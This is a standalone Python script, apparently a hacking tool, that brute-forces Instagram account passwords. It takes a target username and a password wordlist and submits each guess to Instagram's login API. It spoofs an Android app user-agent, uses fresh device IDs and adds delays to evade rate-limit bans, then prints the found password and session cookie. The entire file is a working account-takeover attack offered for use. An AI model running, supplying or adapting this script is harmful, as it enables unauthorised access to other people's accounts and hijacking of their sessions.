import requests
from uuid import uuid4
import time

# Dummy user-agent headers (simplified)
headers = {
    "User-Agent": "Instagram 155.0.0.37.107 Android",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive"
}

# Get username and password list file
username = input("[+] Enter Username: ")
wordlist_path = input("[+] Enter Password List File Path (e.g., wordlist.txt): ")

# Read passwords from file safely with encoding handling
try:
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print("[!] File not found.")
    exit()

# Brute-force loop
for i, password in enumerate(passwords):
    print(f"[*] Trying password {i+1}/{len(passwords)}: {password}")

    data = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false",
        "device_id": str(uuid4())
    }

    response = requests.post("https://i.instagram.com/api/v1/accounts/login/", headers=headers, data=data)

    # Delay to avoid IP ban (Instagram has rate limiting)
    time.sleep(5)

    if response.status_code == 200 and "logged_in_user" in response.text:
        session_id = response.cookies.get("sessionid")
        print(f"[+] SUCCESS! Password found: {password}")
        print(f"[+] Session ID: {session_id}")
        break
    elif "bad_password" in response.text:
        continue
    elif "challenge_required" in response.text:
        print("[!] Challenge Required (2FA or suspicious login triggered).")
        break
    else:
        print("[!] Unknown response or blocked.")
        print("[DEBUG]:", response.text[:200])
        break
else:
    print("[!] Password not found in wordlist.")
